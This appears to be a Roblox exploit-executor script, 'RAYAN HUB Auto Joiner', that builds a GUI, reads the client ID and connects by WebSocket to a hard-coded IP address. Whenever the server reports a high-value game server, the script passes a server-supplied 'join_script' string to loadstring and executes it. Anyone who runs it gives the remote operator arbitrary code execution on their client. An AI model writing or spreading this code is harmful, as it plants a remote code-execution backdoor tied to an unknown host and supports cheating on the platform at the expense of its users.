local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

pcall(function()
    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
    local clientId = RbxAnalyticsService:GetClientId()
end)

local autoJoinEnabled = false
local minMoneyThreshold = 1

local function parseMoneyValue(moneyString)
    local value = moneyString:match("%$([%d%.]+)")
    if not value then return 0 end
    
    local number = tonumber(value)
    if not number then return 0 end
    
    if moneyString:match("M") then
        return number
    elseif moneyString:match("K") then
        return number / 1000
    end
    
    return number
end

local function shouldJoinServer(data)
    if not autoJoinEnabled then return false end
    if not data or not data.money then return false end
    
    local moneyValue = parseMoneyValue(data.money)
    return moneyValue >= minMoneyThreshold
end

local function executeJoinScript(joinScript)
    if not joinScript then return end
    
    local success, err = pcall(function()
        loadstring(joinScript)()
    end)
    
    if not success then
        warn("Failed to join server:", err)
    end
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AutoJoinUI"
screenGui.Parent = game:GetService("CoreGui")

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 200)
mainFrame.Position = UDim2.new(0.5, -150, 0.4, -100)
mainFrame.BackgroundColor3 = Color3.fromRGB(70, 30, 120)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 12)
frameCorner.Parent = mainFrame

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, 0, 0, 40)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundColor3 = Color3.fromRGB(50, 20, 90)
titleLabel.Text = "RAYAN HUB | AUTO JOINER"
titleLabel.TextColor3 = Color3.fromRGB(240, 220, 255)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 18
titleLabel.TextXAlignment = Enum.TextXAlignment.Center
titleLabel.TextYAlignment = Enum.TextYAlignment.Center
titleLabel.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Parent = titleLabel

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 28, 0, 20)
closeButton.Position = UDim2.new(1, -34, 0, 10)
closeButton.BackgroundColor3 = Color3.fromRGB(120, 60, 180)
closeButton.Text = "X"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.Font = Enum.Font.GothamBold
closeButton.TextSize = 16
closeButton.Parent = mainFrame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 6)
closeCorner.Parent = closeButton

closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(1, -20, 0, 35)
toggleButton.Position = UDim2.new(0, 10, 0, 50)
toggleButton.BackgroundColor3 = Color3.fromRGB(90, 50, 150)
toggleButton.Text = "Auto Join: OFF"
toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleButton.Font = Enum.Font.GothamBold
toggleButton.TextSize = 16
toggleButton.Parent = mainFrame

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 8)
toggleCorner.Parent = toggleButton

toggleButton.MouseButton1Click:Connect(function()
    autoJoinEnabled = not autoJoinEnabled
    
    if autoJoinEnabled then
        toggleButton.Text = "Auto Join: ON"
        toggleButton.TextColor3 = Color3.fromRGB(180, 255, 180)
    else
        toggleButton.Text = "Auto Join: OFF"
        toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    end
end)

local minLabel = Instance.new("TextLabel")
minLabel.Size = UDim2.new(1, -20, 0, 25)
minLabel.Position = UDim2.new(0, 10, 0, 95)
minLabel.BackgroundTransparency = 1
minLabel.Text = "Min M/s: 1.0M"
minLabel.TextColor3 = Color3.fromRGB(240, 220, 255)
minLabel.Font = Enum.Font.Gotham
minLabel.TextSize = 14
minLabel.Parent = mainFrame

local inputBox = Instance.new("TextBox")
inputBox.Size = UDim2.new(1, -20, 0, 25)
inputBox.Position = UDim2.new(0, 10, 0, 120)
inputBox.BackgroundColor3 = Color3.fromRGB(60, 35, 100)
inputBox.Text = "1"
inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
inputBox.Font = Enum.Font.Gotham
inputBox.TextSize = 14
inputBox.ClearTextOnFocus = false
inputBox.Parent = mainFrame

local inputCorner = Instance.new("UICorner")
inputCorner.CornerRadius = UDim.new(0, 6)
inputCorner.Parent = inputBox

inputBox.FocusLost:Connect(function()
    local value = tonumber(inputBox.Text)
    if value and value > 0 then
        minMoneyThreshold = value
        minLabel.Text = "Min M/s: " .. value .. "M"
    else
        inputBox.Text = tostring(minMoneyThreshold)
    end
end)

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -20, 0, 30)
statusLabel.Position = UDim2.new(0, 10, 0, 155)
statusLabel.BackgroundColor3 = Color3.fromRGB(50, 25, 80)
statusLabel.Text = "Waiting for servers..."
statusLabel.TextColor3 = Color3.fromRGB(200, 180, 220)
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 12
statusLabel.TextXAlignment = Enum.TextXAlignment.Center
statusLabel.TextYAlignment = Enum.TextYAlignment.Center
statusLabel.Parent = mainFrame

local statusCorner = Instance.new("UICorner")
statusCorner.CornerRadius = UDim.new(0, 6)
statusCorner.Parent = statusLabel

local websocket = WebSocket.connect("ws://144.172.110.44:8765/script")

websocket.OnMessage:Connect(function(message)
    local success, serverData = pcall(function()
        return HttpService:JSONDecode(message)
    end)
    
    if not success then
        warn("Failed to decode message:", message)
        return
    end
    
    if serverData.type == "snapshot" and serverData.data then
        local data = serverData.data
        
        statusLabel.Text = string.format("%s - %s - %s", 
            data.name or "Unknown",
            data.money or "$0",
            data.channel or "No Channel"
        )
        
        if shouldJoinServer(data) then
            statusLabel.Text = "Joining: " .. (data.name or "Unknown")
            statusLabel.TextColor3 = Color3.fromRGB(180, 255, 180)
            
            task.wait(0.5)
            executeJoinScript(data.join_script)
        end
    end
end)

websocket.OnClose:Connect(function()
    statusLabel.Text = "Disconnected from server"
    statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
end)

print("RAYAN HUB Auto Joiner loaded successfully")
